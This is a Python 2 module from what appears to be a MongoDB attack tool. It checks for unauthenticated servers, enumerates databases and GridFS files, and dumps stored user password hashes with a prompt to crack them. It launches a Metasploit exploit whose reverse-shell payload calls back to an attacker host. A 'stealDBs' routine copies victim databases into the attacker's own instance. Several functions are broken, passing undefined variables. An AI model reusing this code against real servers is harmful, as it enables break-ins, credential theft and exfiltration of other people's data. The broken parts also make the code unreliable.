'''
'''
from prettyPrint import *
from prettyPrint import prettyPrint as pp
from os import system
import subprocess
import pymongo
import gridfs
import re,sys,hashlib
import threading,time

class mongodbModule:
    
    def mongodbConnect(self,ip,port):
        try:
            conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
            try:
                dbList = conn.database_names()
                dbVer = conn.server_info()['version']
                conn.disconnect()
                return [0,dbVer]
            except:
                if str(sys.exc_info()).find('need to login') != -1:
                    conn.disconnect()
                    return [1,None]
                else:
                    conn.disconnect()
                    return [2,None]
        except:
            return [3,None]
        
    def accessCheck(self,ip,port,pingIt):
        
        if pingIt == True:
            test = system("ping -c 1 -n -W 1 " + ip + ">/dev/null")
            if test == 0:	
                res = self.mongodbConnect(ip,port)
                return res
            else:
                return [4,None]
        else:
            return self.mongodbConnect(ip,port)
                    
    def getPlatInfo(self,mongoConn):
        pp.prettyPrint("Mongodb Server Basic Info",GREEN)
        pp.prettyPrint("MongoDB Version: " + mongoConn.server_info()['version'],PURPLE)
        pp.prettyPrint("Debugs enabled : " + str(mongoConn.server_info()['debug']),PURPLE)
        pp.prettyPrint("Platform: " + str(mongoConn.server_info()['bits']) + " bit",PURPLE)
        return

    def enumDbs (self,mongoConn):
        try:
            pp.prettyPrint("List of databases:",GREEN)
            pp.prettyPrint("\n".join(mongoConn.database_names()),PURPLE)
        except:
            pp.prettyPrint("[!]Error:  Couldn't list databases.  The provided credentials may not have rights.",RED)

        pp.prettyPrint("List of collections:",GREEN)
        try:
            for dbItem in mongoConn.database_names():
                db = mongoConn[dbItem]
                pp.prettyPrint(dbItem + ":",CYAN)
                pp.prettyPrint("\n".join(db.collection_names()),PURPLE)
                if 'system.users' in db.collection_names():
                    users = list(db.system.users.find())
                    pp.prettyPrint("Database Users and Password Hashes:",GREEN)
                    for x in range (0,len(users)):
                        pp.prettyPrint("Username: " + users[x]['user'],GREEN)
                        pp.prettyPrint("Hash: " + users[x]['pwd'],GREEN)
                        pp.prettyPrint("\n",GREEN)
                        crack = raw_input("Crack this hash (y/n)? ")
                        if crack.lower() == "y":
                            self.passCrack(users[x]['user'],users[x]['pwd'])
        except:
            pp.prettyPrint("[!]Error:  Couldn't list collections.  The provided credentials may not have rights.",RED)
            return
                
    def msfLaunch(self,RHOST,LHOST,LPORT):			
        try:
            proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(RHOST) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(LHOST) + " LPORT="+ str(LPORT) + " E", shell=True)
        except:
            pp.prettyPrint("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.",RED)
            return
            
    def enumGrid (self,mongoConn):
        try:
            for dbItem in mongoConn.database_names():
                try:
                    db = mongoConn[dbItem]
                    fs = gridfs.GridFS(db)
                    files = fs.list()
                    pp.prettyPrint("GridFS enabled on database " + str(dbItem),GREEN)
                    pp.prettyPrint(" list of files:",GREEN)
                    pp.prettyPrint("\n".join(files),PURPLE)
                except:
                    pp.prettyPrint("GridFS not enabled on " + str(dbItem) + ".",RED)
        except:
            pp.prettyPrint("[!]Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights.",RED)
        return

    def stealDBs(self,LHOST,LPORT,RHOST,mongoConn):
        victim = RHOST
        localDbIp = LHOST
        localDbPort = int(LPORT)
        dbList = mongoConn.database_names()
        menuItem = 1
        if len(dbList) == 0:
            pp.prettyPrint("Can't get a list of databases to steal.  The provided credentials may not have rights.",YELLOW)
            return
        
        for dbName in dbList:
            pp.prettyPrint(str(menuItem) + "-" + dbName,GREEN)
            menuItem += 1
        
        try:
            dbLoot = raw_input("Select a database to steal:")
        except:
            pp.prettyPrint("[!]Invalid selection.",RED)
            stealDBs(myDB,mongoConn)
            
        try:
            #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
            dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
            if dbNeedCreds.lower() == "n":
                myDBConn = pymongo.MongoClient(localDbIp,localDbPort)
                myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
            elif dbNeedCreds.lower() == "y":
                dbUser = raw_input("Enter database username: ")
                dbPass = raw_input("Enter database password: ")
                myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
            else:
                pp.prettyPrint("[!]Invalid Selection.  Press enter to continue.",RED)
                stealDBs(myDB,mongoConn)
                
            cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
            if cloneAnother.lower() == "y":
                self.stealDBs(myDB,mongoConn)
            else:
                return
        except:
            if str(sys.exc_info()).find('text search not enabled') != -1:
                pp.prettyPrint("Database copied, but text indexing was not enabled on the target.  Indexes not moved.",GREEN)
                return
            else:	
                pp.prettyPrint("[!]Something went wrong.  Are you sure your MongoDB is running and options are set?",RED)
                return
        
		
if __name__ == '__main__':
    print __doc__
